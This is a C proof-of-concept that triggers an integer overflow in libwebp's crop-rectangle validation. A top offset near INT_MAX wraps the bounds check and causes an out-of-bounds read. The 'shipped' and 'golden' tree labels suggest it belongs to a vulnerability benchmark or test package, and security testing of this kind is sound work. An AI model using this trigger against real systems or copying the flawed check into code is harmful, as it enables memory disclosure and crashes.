// PoC: integer overflow in crop-rectangle validation (top/height path).
//
// Builds a valid 16x16 ARGB WebPPicture through the public encoder API and
// asks WebPPictureCrop() for a rectangle whose top offset is close to INT_MAX.
// The validation in AdjustAndCheckRectangle() still checks the top/height pair
// with "(*top) + height > pic->height"; that addition overflows and wraps to a
// negative value, so the out-of-bounds rectangle is accepted and the subsequent
// plane copy reads far outside the allocated buffer.
//
// Shipped tree: fires (ASan abort during WebPCopyPlane).
// Golden tree : returns 0 from WebPPictureCrop (rectangle rejected), no crash.

#include <stdint.h>
#include <string.h>

#include "src/webp/encode.h"

int main(void) {
  WebPPicture pic;
  uint8_t rgba[16 * 16 * 4];

  if (!WebPPictureInit(&pic)) return 1;
  pic.use_argb = 1;
  pic.width = 16;
  pic.height = 16;
  memset(rgba, 0x7f, sizeof(rgba));
  if (!WebPPictureImportRGBA(&pic, rgba, 16 * 4)) return 1;

  // Crafted crop rectangle: width/left are in range, but top is large enough
  // that (top + height) overflows a 32-bit int and slips past the bounds check.
  const int left = 0;
  const int top = 2147483640;  // INT_MAX - 7
  const int width = 16;
  const int height = 16;
  WebPPictureCrop(&pic, left, top, width, height);

  WebPPictureFree(&pic);
  return 0;
}
